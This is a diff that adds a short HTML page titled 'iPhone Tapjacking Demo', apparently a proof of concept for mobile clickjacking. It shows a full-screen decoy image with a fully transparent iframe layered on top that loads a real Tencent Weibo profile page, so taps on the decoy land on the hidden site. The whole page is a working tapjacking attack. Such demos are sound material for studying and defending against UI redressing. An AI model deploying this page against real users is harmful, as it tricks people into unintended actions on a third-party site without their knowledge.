@@ -1,0 +1,35 @@
+<html>
+<head>
+	<title>iPhone Tapjacking Demo</title>
+	<meta name="viewport" content="width=320; initial-scale=1; user-scalable=no;"/>
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+	<style>
+body{
+	margin:0;
+	padding:0;
+	}
+#hidden{
+    height: 260px;
+    width: 300px;
+    top:30px;
+    overflow:hidden;
+    position: absolute;
+    filter: alpha(opacity=0);
+    opacity:0;
+    z-index:2;
+	 }
+#d1{
+    width:320px;
+height:480px;
+
+    position:absolute;
+    z-index:1;
+}
+</style>
+</head>
+<body>
+<img id="d1" src="spoof-1.png">
+<iframe id="hidden" src="http://t.qq.com/xisigr" scrolling="no"></iframe>
+</body>
+</html>
